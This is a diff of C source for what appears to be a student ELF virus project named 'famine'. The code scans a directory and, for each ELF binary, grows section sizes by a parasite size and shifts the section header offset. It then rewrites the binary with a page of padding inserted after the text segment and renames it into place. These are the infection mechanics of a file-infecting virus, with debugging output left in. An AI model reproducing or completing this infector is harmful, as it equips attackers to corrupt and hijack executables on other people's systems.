@@ -61,6 +61,7 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
 __syscall3(int, getdents64, int, fd, void *, dirp,  uint, count);
 __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
+__syscall2(int, rename, const char *, old, const char *, new);
 
 
 __syscall1(int, close, int, fd);
@@ -207,13 +208,15 @@ int out_of_range(t_file *file, void * ptr)
 	return (0);
 }
 
-void new_file(t_file *file, size_t end_of_text)
+void new_file(t_file *file, size_t end_of_text,char *path)
 {
 	int fd;
 	char *data;
-	printf("new_file debut\n");
-	unlink(".woody");
-	if ((fd = open ("./.woody", O_CREAT | O_RDWR | O_TRUNC, 0555)) < 0)
+	char tmp[125];
+	tmp[0] = '/';
+	ft_memmove(tmp + 1,path, ft_strlen(path));
+	printf("new_file debut %s\n",tmp);
+	if ((fd = open (tmp, O_CREAT | O_RDWR | O_TRUNC, 0755)) < 0)
 	{
 
 		printf("error open fd %d\n",fd);
@@ -232,17 +235,26 @@ void new_file(t_file *file, size_t end_of_text)
 	printf("new_file 2\n");
 
 	///write(fd,file->data,file->size + PAGE_SIZE);
-	for (int i = 0; i< file->size + PAGE_SIZE;i++)
-	write(fd,"j",1);
-	//write(fd,file->data + end_of_text, file->size - end_of_text);
+
+	write(fd,file->data, end_of_text);
+	for (int i = 0; i< PAGE_SIZE;i++)
+		write(fd,"j",1);
+	write(fd,file->data + end_of_text, file->size - end_of_text);
 	ft_memmove(data,file->data, end_of_text);
 	ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
-	printf("fin memove\n");
 	write(1,data, 15);
+	printf("tmp %s, path %s\n",tmp, path);
+	close(file->fd);
+	close(fd);
+	munmap(file->data,file->size);
+	munmap(data, file->size + PAGE_SIZE);
+	int ret = rename (tmp, "/root/42_project/famine/a");
+	printf("fin memove %d\n",ret);
+	perror("retour");
 
 }
 
-int do_the_job(t_file *file)
+int do_the_job(t_file *file, char *path)
 {
 	printf("debut do_the_job\n");
 	Elf64_Ehdr          *header;
@@ -321,7 +333,7 @@ int do_the_job(t_file *file)
 			sec->sh_size += parasite_size;
 	}
 	header->e_shoff += PAGE_SIZE;
-	new_file(file,end_of_text);
+	new_file(file,end_of_text, path);
 	printf("fim do_the_job\n");
 	return 0;
 }
@@ -366,7 +378,7 @@ int open_directory(const char *path)
 		printf("%s %s\n",d->d_name,path_file);
 		if (open_map(path_file,&file) == 0)
 		{
-			do_the_job(&file);
+			do_the_job(&file,path_file );
 			close(file.fd);
 			munmap(file.data,file.size);
 			exit(4);
